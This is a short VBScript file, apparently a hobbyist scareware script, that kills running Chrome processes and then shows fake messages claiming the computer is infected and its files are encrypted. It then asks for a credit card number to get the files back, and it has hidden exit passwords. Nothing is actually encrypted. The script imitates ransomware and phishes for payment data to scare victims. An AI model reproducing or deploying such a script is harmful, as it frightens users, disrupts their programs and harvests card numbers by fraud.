'If you Have Found This File, You Have Unlocked the Key However, 
'The Password is Found Below
'Arbiter will be Watching Everything You do
'___________________________________________________________________________________________________________________________________________________________________
strComputer = "." 'Start of Intimidation if Working
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
 
Set colProcessList = objWMIService.ExecQuery _
    ("Select * from Win32_Process Where Name = 'Chrome.exe'")
 
Set oShell = CreateObject("WScript.Shell")
For Each objProcess in colProcessList
    oShell.Run "taskkill /im chrome.exe", , True
Next


Wscript.Echo "Your Computer Has Been Infected"
Wscript.Echo "Your Files Have Been Encrypted"
Trials = 0
strAnswer = InputBox("Enter a Valid Credit Card Number to Get Your Files Back")
CreateObject("Wscript.Shell").Run("E:\User_Files\Stardate.vbs")
If strAnswer = "SysEnd()" Then
	Wscript.Quit
End If
If strAnswer = "SysPass()" Then
	CreateObject("Wscript.Shell").Run("E:\System_Files\File_Safe.vbs")
End If
	
'_______________________________________________________________________________________________________________________________________________________
'This is Built to Be an Operating System, Edit it to Increase Power or to Find the Purpose
'These Files are Property of Cryptonium2119
'Most Recent Version Written in: 10:39 PM 10/9/2018